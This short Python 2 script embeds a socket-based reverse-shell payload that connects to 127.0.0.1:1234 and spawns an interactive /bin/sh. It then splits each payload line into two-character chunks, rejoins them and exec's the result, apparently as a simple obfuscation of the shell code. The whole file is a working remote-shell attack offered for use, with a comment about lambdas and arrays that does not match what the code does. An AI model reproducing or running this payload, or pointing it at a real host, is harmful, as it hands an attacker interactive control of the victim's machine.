import re

template_reverse_shell = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""
# use lambda functions to make a array of arrays, two dimensional, or a list of lists
lines = template_reverse_shell.splitlines()
for l in lines:
    array = re.findall('..?',l)
    print array
    cmd = "".join(array)
    print "Reconstituted:\r\n",cmd
    exec(cmd)
